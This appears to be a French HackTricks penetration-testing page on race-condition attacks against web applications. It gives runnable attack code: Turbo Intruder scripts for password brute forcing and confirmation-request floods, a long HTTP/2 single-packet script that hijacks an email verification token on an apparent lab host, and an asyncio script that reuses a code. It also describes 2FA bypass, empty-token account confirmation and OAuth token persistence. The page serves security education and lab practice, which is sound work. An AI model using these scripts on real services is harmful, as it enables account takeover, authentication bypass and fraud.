# Condition de course

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Utilisez [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) pour construire facilement et **automatiser des workflows** aliment√©s par les outils communautaires les plus avanc√©s au monde.\
Acc√©dez-y aujourd'hui :

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert de l'√©quipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts GitHub.

</details>

{% hint style="warning" %}
Pour obtenir une compr√©hension approfondie de cette technique, consultez le rapport original sur [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)
{% endhint %}

## Am√©lioration des attaques de condition de course

Le principal obstacle pour tirer parti des conditions de course est de s'assurer que plusieurs requ√™tes sont trait√©es en m√™me temps, avec **tr√®s peu de diff√©rence dans leurs temps de traitement - id√©alement, moins de 1 ms**.

Voici quelques techniques pour synchroniser les requ√™tes :

#### Attaque en un seul paquet HTTP/2 contre la synchronisation du dernier octet HTTP/1.1

* **HTTP/2** : prend en charge l'envoi de deux requ√™tes sur une seule connexion TCP, r√©duisant l'impact du jitter du r√©seau. Cependant, en raison de variations c√¥t√© serveur, deux requ√™tes peuvent ne pas suffire pour une exploitation coh√©rente de la condition de course.
* **HTTP/1.1 'Synchronisation du dernier octet'** : permet l'envoi pr√©alable de la plupart des parties de 20 √† 30 requ√™tes, en retenant un petit fragment, qui est ensuite envoy√© ensemble, atteignant une arriv√©e simultan√©e au serveur.

La **pr√©paration √† la synchronisation du dernier octet** implique :

1. Envoyer les en-t√™tes et les donn√©es du corps moins le dernier octet sans terminer le flux.
2. Mettre en pause pendant 100 ms apr√®s l'envoi initial.
3. D√©sactiver TCP\_NODELAY pour utiliser l'algorithme de Nagle pour regrouper les trames finales.
4. Faire un ping pour chauffer la connexion.

L'envoi ult√©rieur des trames retenues devrait entra√Æner leur arriv√©e dans un seul paquet, v√©rifiable via Wireshark. Cette m√©thode ne s'applique pas aux fichiers statiques, qui ne sont g√©n√©ralement pas impliqu√©s dans les attaques RC.

### Adaptation √† l'architecture du serveur

Comprendre l'architecture de la cible est crucial. Les serveurs frontaliers peuvent router les requ√™tes diff√©remment, affectant le timing. Le pr√©chauffage c√¥t√© serveur, √† travers des requ√™tes insignifiantes, pourrait normaliser le timing des requ√™tes.

#### Gestion du verrouillage bas√© sur la session

Les frameworks comme le gestionnaire de session PHP s√©rialisent les requ√™tes par session, obscurcissant potentiellement les vuln√©rabilit√©s. L'utilisation de jetons de session diff√©rents pour chaque requ√™te peut contourner ce probl√®me.

#### Surmonter les limites de taux ou de ressources

Si le pr√©chauffage de la connexion est inefficace, d√©clencher intentionnellement les retards de limite de taux ou de ressources des serveurs web en inondant de fausses requ√™tes pourrait faciliter l'attaque en un seul paquet en induisant un retard c√¥t√© serveur propice aux conditions de course.

## Exemples d'attaque

* **Tubo Intruder - Attaque en un seul paquet HTTP2 (1 point de terminaison)** : Vous pouvez envoyer la requ√™te √† **Turbo Intruder** (`Extensions` -> `Turbo Intruder` -> `Send to Turbo Intruder`), vous pouvez changer dans la requ√™te la valeur que vous souhaitez brute forcer pour **`%s`** comme dans `csrf=Bn9VQB8OyefIs3ShR2fPESR0FzzulI1d&username=carlos&password=%s` puis s√©lectionner **`examples/race-single-packer-attack.py`** dans le menu d√©roulant :

<figure><img src="../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Si vous allez **envoyer des valeurs diff√©rentes**, vous pourriez modifier le code avec celui-ci qui utilise une liste de mots du presse-papiers :
```python
passwords = wordlists.clipboard
for password in passwords:
engine.queue(target.req, password, gate='race1')
```
{% hint style="warning" %}
Si le site web ne prend pas en charge HTTP2 (uniquement HTTP1.1), utilisez `Engine.THREADED` ou `Engine.BURP` au lieu de `Engine.BURP2`.
{% endhint %}

* **Intrus de Tube - Attaque √† un seul paquet HTTP2 (Plusieurs points de terminaison)**: Dans le cas o√π vous devez envoyer une requ√™te √† 1 point de terminaison, puis √† plusieurs autres points de terminaison pour d√©clencher l'ex√©cution de code √† distance, vous pouvez modifier le script `race-single-packet-attack.py` comme suit :
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=1,
engine=Engine.BURP2
)

# Hardcode the second request for the RC
confirmationReq = '''POST /confirm?token[]= HTTP/2
Host: 0a9c00370490e77e837419c4005900d0.web-security-academy.net
Cookie: phpsessionid=MpDEOYRvaNT1OAm0OtAsmLZ91iDfISLU
Content-Length: 0

'''

# For each attempt (20 in total) send 50 confirmation requests.
for attempt in range(20):
currentAttempt = str(attempt)
username = 'aUser' + currentAttempt

# queue a single registration request
engine.queue(target.req, username, gate=currentAttempt)

# queue 50 confirmation requests - note that this will probably sent in two separate packets
for i in range(50):
engine.queue(confirmationReq, gate=currentAttempt)

# send all the queued requests for this attempt
engine.openGate(currentAttempt)
```
* Il est √©galement disponible dans **Repeater** via la nouvelle option '**Envoyer le groupe en parall√®le**' dans Burp Suite.
* Pour **limit-overrun**, vous pourriez simplement ajouter la **m√™me requ√™te 50 fois** dans le groupe.
* Pour le **pr√©chauffage de la connexion**, vous pourriez **ajouter** au **d√©but** du **groupe** quelques **requ√™tes** vers une partie non statique du serveur web.
* Pour **retarder** le processus **entre** le traitement **d'une requ√™te et d'une autre** en 2 √©tapes de sous-√©tats, vous pourriez **ajouter des requ√™tes suppl√©mentaires entre** les deux requ√™tes.
* Pour un RC √† **multi-point d'extr√©mit√©**, vous pourriez commencer √† envoyer la **requ√™te** qui **va vers l'√©tat cach√©** puis **50 requ√™tes** juste apr√®s qui **exploitent l'√©tat cach√©**.

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* **Script python automatis√©**: Le but de ce script est de changer l'email d'un utilisateur tout en le v√©rifiant continuellement jusqu'√† ce que le jeton de v√©rification du nouvel email arrive au dernier email (cela est d√ª √† un RC o√π il √©tait possible de modifier un email mais de recevoir la v√©rification sur l'ancien car la variable indiquant l'email √©tait d√©j√† renseign√©e avec le premier).\
Lorsque le mot "objetivo" est trouv√© dans les emails re√ßus, nous savons que nous avons re√ßu le jeton de v√©rification de l'email modifi√© et nous terminons l'attaque.
```python
# https://portswigger.net/web-security/race-conditions/lab-race-conditions-limit-overrun
# Script from victor to solve a HTB challenge
from h2spacex import H2OnTlsConnection
from time import sleep
from h2spacex import h2_frames
import requests

cookie="session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwiZXhwIjoxNzEwMzA0MDY1LCJhbnRpQ1NSRlRva2VuIjoiNDJhMDg4NzItNjEwYS00OTY1LTk1NTMtMjJkN2IzYWExODI3In0.I-N93zbVOGZXV_FQQ8hqDMUrGr05G-6IIZkyPwSiiDg"

# change these headers

headersObjetivo= """accept: */*
content-type: application/x-www-form-urlencoded
Cookie: """+cookie+"""
Content-Length: 112
"""

bodyObjetivo = 'email=objetivo%40apexsurvive.htb&username=estes&fullName=test&antiCSRFToken=42a08872-610a-4965-9553-22d7b3aa1827'

headersVerification= """Content-Length: 1
Cookie: """+cookie+"""
"""
CSRF="42a08872-610a-4965-9553-22d7b3aa1827"

host = "94.237.56.46"
puerto =39697


url = "https://"+host+":"+str(puerto)+"/email/"

response = requests.get(url, verify=False)


while "objetivo" not in response.text:

urlDeleteMails = "https://"+host+":"+str(puerto)+"/email/deleteall/"

responseDeleteMails = requests.get(urlDeleteMails, verify=False)
#print(response.text)
# change this host name to new generated one

Headers = { "Cookie" : cookie, "content-type": "application/x-www-form-urlencoded" }
data="email=test%40email.htb&username=estes&fullName=test&antiCSRFToken="+CSRF
urlReset="https://"+host+":"+str(puerto)+"/challenge/api/profile"
responseReset = requests.post(urlReset, data=data, headers=Headers, verify=False)

print(responseReset.status_code)

h2_conn = H2OnTlsConnection(
hostname=host,
port_number=puerto
)

h2_conn.setup_connection()

try_num = 100

stream_ids_list = h2_conn.generate_stream_ids(number_of_streams=try_num)

all_headers_frames = []  # all headers frame + data frames which have not the last byte
all_data_frames = []  # all data frames which contain the last byte


for i in range(0, try_num):
last_data_frame_with_last_byte=''
if i == try_num/2:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(  # noqa: E501
method='POST',
headers_string=headersObjetivo,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=bodyObjetivo,
path='/challenge/api/profile'
)
else:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(
method='GET',
headers_string=headersVerification,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=".",
path='/challenge/api/sendVerification'
)

all_headers_frames.append(header_frames_without_last_byte)
all_data_frames.append(last_data_frame_with_last_byte)


# concatenate all headers bytes
temp_headers_bytes = b''
for h in all_headers_frames:
temp_headers_bytes += bytes(h)

# concatenate all data frames which have last byte
temp_data_bytes = b''
for d in all_data_frames:
temp_data_bytes += bytes(d)

h2_conn.send_bytes(temp_headers_bytes)




# wait some time
sleep(0.1)

# send ping frame to warm up connection
h2_conn.send_ping_frame()

# send remaining data frames
h2_conn.send_bytes(temp_data_bytes)

resp = h2_conn.read_response_from_socket(_timeout=3)
frame_parser = h2_frames.FrameParser(h2_connection=h2_conn)
frame_parser.add_frames(resp)
frame_parser.show_response_of_sent_requests()

print('---')

sleep(3)
h2_conn.close_connection()

response = requests.get(url, verify=False)
```
### Bruteforce Brut

Avant les recherches pr√©c√©dentes, voici quelques charges utiles utilis√©es qui ont simplement essay√© d'envoyer les paquets le plus rapidement possible pour provoquer une RC.

* **R√©p√©teur:** Consultez les exemples de la section pr√©c√©dente.
* **Intrus:** Envoyez la **requ√™te** √† **Intrus**, d√©finissez le **nombre de threads** sur **30** dans le menu **Options**, s√©lectionnez comme charge utile **Charges utiles nulles** et g√©n√©rez **30.**
* **Turbo Intrus**
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
pipeline=False
)
a = ['Session=<session_id_1>','Session=<session_id_2>','Session=<session_id_3>']
for i in range(len(a)):
engine.queue(target.req,a[i], gate='race1')
# open TCP connections and send partial requests
engine.start(timeout=10)
engine.openGate('race1')
engine.complete(timeout=60)

def handleResponse(req, interesting):
table.add(req)
```
* **Python - asyncio**
```python
import asyncio
import httpx

async def use_code(client):
resp = await client.post(f'http://victim.com', cookies={"session": "asdasdasd"}, data={"code": "123123123"})
return resp.text

async def main():
async with httpx.AsyncClient() as client:
tasks = []
for _ in range(20): #20 times
tasks.append(asyncio.ensure_future(use_code(client)))

# Get responses
results = await asyncio.gather(*tasks, return_exceptions=True)

# Print results
for r in results:
print(r)

# Async2sync sleep
await asyncio.sleep(0.5)
print(results)

asyncio.run(main())
```
## **M√©thodologie RC**

### D√©passement de limite / TOCTOU

Il s'agit du type le plus basique de condition de course o√π des **vuln√©rabilit√©s** apparaissent dans des endroits qui **limitent le nombre de fois o√π vous pouvez effectuer une action**. Comme utiliser plusieurs fois le m√™me code de r√©duction dans une boutique en ligne. Un exemple tr√®s simple peut √™tre trouv√© dans [**ce rapport**](https://medium.com/@pravinponnusamy/race-condition-vulnerability-found-in-bug-bounty-program-573260454c43) ou dans [**ce bug**](https://hackerone.com/reports/759247)**.**

Il existe de nombreuses variations de ce type d'attaque, notamment :

* Utiliser plusieurs fois une carte-cadeau
* Noter un produit plusieurs fois
* Retirer ou transf√©rer de l'argent en exc√®s par rapport √† votre solde de compte
* R√©utiliser une solution CAPTCHA unique
* Contourner une limite de taux anti-brute force

### **Sous-√©tats cach√©s**

Exploiter des conditions de course complexes implique souvent de profiter de br√®ves opportunit√©s pour interagir avec des sous-√©tats de machine cach√©s ou **non intentionnels**. Voici comment aborder cela :

1. **Identifier les sous-√©tats cach√©s potentiels**
* Commencez par rep√©rer les points de terminaison qui modifient ou interagissent avec des donn√©es critiques, telles que les profils d'utilisateurs ou les processus de r√©initialisation de mot de passe. Concentrez-vous sur :
* **Stockage** : Privil√©giez les points de terminaison qui manipulent des donn√©es persistantes c√¥t√© serveur par rapport √† ceux qui g√®rent des donn√©es c√¥t√© client.
* **Action** : Recherchez les op√©rations qui modifient des donn√©es existantes, plus susceptibles de cr√©er des conditions exploitables par rapport √† celles qui ajoutent de nouvelles donn√©es.
* **Identification** : Les attaques r√©ussies impliquent g√©n√©ralement des op√©rations bas√©es sur le m√™me identifiant, par exemple, le nom d'utilisateur ou le jeton de r√©initialisation.
2. **Effectuer des sondages initiaux**
* Testez les points de terminaison identifi√©s avec des attaques de condition de course, en observant toute d√©viation par rapport aux r√©sultats attendus. Des r√©ponses inattendues ou des changements de comportement de l'application peuvent signaler une vuln√©rabilit√©.
3. **D√©montrer la vuln√©rabilit√©**
* R√©duisez l'attaque au nombre minimal de requ√™tes n√©cessaires pour exploiter la vuln√©rabilit√©, souvent juste deux. Cette √©tape peut n√©cessiter plusieurs tentatives ou une automatisation en raison de la synchronisation pr√©cise impliqu√©e.

### Attaques sensibles au temps

La pr√©cision dans la synchronisation des requ√™tes peut r√©v√©ler des vuln√©rabilit√©s, notamment lorsque des m√©thodes pr√©visibles comme les horodatages sont utilis√©es pour les jetons de s√©curit√©. Par exemple, g√©n√©rer des jetons de r√©initialisation de mot de passe bas√©s sur des horodatages pourrait permettre d'obtenir des jetons identiques pour des requ√™tes simultan√©es.

**Pour exploiter :**

* Utilisez une synchronisation pr√©cise, comme une attaque √† un seul paquet, pour effectuer des demandes de r√©initialisation de mot de passe simultan√©es. Des jetons identiques indiquent une vuln√©rabilit√©.

**Exemple :**

* Demandez deux jetons de r√©initialisation de mot de passe en m√™me temps et comparez-les. Des jetons correspondants sugg√®rent un d√©faut dans la g√©n√©ration de jetons.

**Consultez ce** [**laboratoire PortSwigger**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-exploiting-time-sensitive-vulnerabilities) **pour essayer cela.**

## √âtudes de cas sur les sous-√©tats cach√©s

### Payer et ajouter un article

Consultez ce [**laboratoire PortSwigger**](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-insufficient-workflow-validation) pour voir comment **payer** dans un magasin et **ajouter un article suppl√©mentaire** que vous **n'aurez pas √† payer**.

### Confirmer d'autres e-mails

L'id√©e est de **v√©rifier une adresse e-mail et la changer pour une autre en m√™me temps** pour savoir si la plateforme v√©rifie la nouvelle adresse modifi√©e.

### Changer l'e-mail en 2 adresses e-mail bas√©es sur les cookies

Selon [**cette recherche**](https://portswigger.net/research/smashing-the-state-machine) Gitlab √©tait vuln√©rable √† une prise de contr√¥le de cette mani√®re car il pourrait **envoyer** le **jeton de v√©rification de l'e-mail d'un e-mail √† l'autre**.

**Consultez ce** [**laboratoire PortSwigger**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-single-endpoint) **pour essayer cela.**

### √âtats de base de donn√©es cach√©s / Contournement de la confirmation

Si **2 √©critures diff√©rentes** sont utilis√©es pour **ajouter** **des informations** dans une **base de donn√©es**, il y a un court laps de temps o√π **seule la premi√®re donn√©e a √©t√© √©crite** dans la base de donn√©es. Par exemple, lors de la cr√©ation d'un utilisateur, le **nom d'utilisateur** et le **mot de passe** peuvent √™tre **√©crits** puis le jeton pour confirmer le compte nouvellement cr√©√© est √©crit. Cela signifie que pendant un court laps de temps, le **jeton pour confirmer un compte est nul**.

Par cons√©quent, **enregistrer un compte et envoyer plusieurs requ√™tes avec un jeton vide** (`token=` ou `token[]=` ou toute autre variation) pour confirmer le compte imm√©diatement pourrait permettre de **confirmer un compte** dont vous ne contr√¥lez pas l'e-mail.

**Consultez ce** [**laboratoire PortSwigger**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-partial-construction) **pour essayer cela.**

### Contournement de l'authentification √† deux facteurs

Le pseudo-code suivant est vuln√©rable √† une condition de course car pendant un tr√®s court laps de temps, l'**authentification √† deux facteurs n'est pas appliqu√©e** tandis que la session est cr√©√©e:
```python
session['userid'] = user.userid
if user.mfa_enabled:
session['enforce_mfa'] = True
# generate and send MFA code to user
# redirect browser to MFA code entry form
```
### Persistance √©ternelle OAuth2

Il existe plusieurs [**fournisseurs OAuth**](https://en.wikipedia.org/wiki/List\_of\_OAuth\_providers). Ces services vous permettront de cr√©er une application et d'authentifier les utilisateurs enregistr√©s par le fournisseur. Pour ce faire, le **client** devra **autoriser votre application** √† acc√©der √† certaines de leurs donn√©es √† l'int√©rieur du **fournisseur OAuth**.\
Ainsi, jusqu'ici, il s'agit simplement d'une connexion classique avec google/linkedin/github... o√π vous √™tes invit√© avec une page disant : "_L'application \<InsertCoolName> souhaite acc√©der √† vos informations, voulez-vous l'autoriser?_"

#### Course Condition dans `authorization_code`

Le **probl√®me** survient lorsque vous **l'acceptez** et envoie automatiquement un **`authorization_code`** √† l'application malveillante. Ensuite, cette **application abuse d'une Course Condition dans le fournisseur de services OAuth pour g√©n√©rer plus d'un AT/RT** (_Authentication Token/Refresh Token_) √† partir du **`authorization_code`** pour votre compte. Fondamentalement, elle exploitera le fait que vous avez accept√© l'application pour acc√©der √† vos donn√©es pour **cr√©er plusieurs comptes**. Ensuite, si vous **arr√™tez d'autoriser l'application √† acc√©der √† vos donn√©es, une paire d'AT/RT sera supprim√©e, mais les autres resteront valides**.

#### Course Condition dans `Refresh Token`

Une fois que vous avez **obtenu un RT valide**, vous pourriez essayer de **l'exploiter pour g√©n√©rer plusieurs AT/RT** et **m√™me si l'utilisateur annule les autorisations** pour l'application malveillante d'acc√©der √† ses donn√©es, **plusieurs RT resteront valides**.

## **CC dans les WebSockets**

Dans [**WS\_RaceCondition\_PoC**](https://github.com/redrays-io/WS\_RaceCondition\_PoC) vous pouvez trouver un PoC en Java pour envoyer des messages websocket en **parall√®le** pour exploiter les **Course Conditions √©galement dans les Web Sockets**.

## R√©f√©rences

* [https://hackerone.com/reports/759247](https://hackerone.com/reports/759247)
* [https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html](https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html)
* [https://hackerone.com/reports/55140](https://hackerone.com/reports/55140)
* [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)
* [https://portswigger.net/web-security/race-conditions](https://portswigger.net/web-security/race-conditions)

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez** üí¨ le groupe Discord](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Utilisez [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) pour construire et **automatiser facilement des workflows** aliment√©s par les outils communautaires les plus avanc√©s au monde.\
Acc√©dez d√®s aujourd'hui :

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
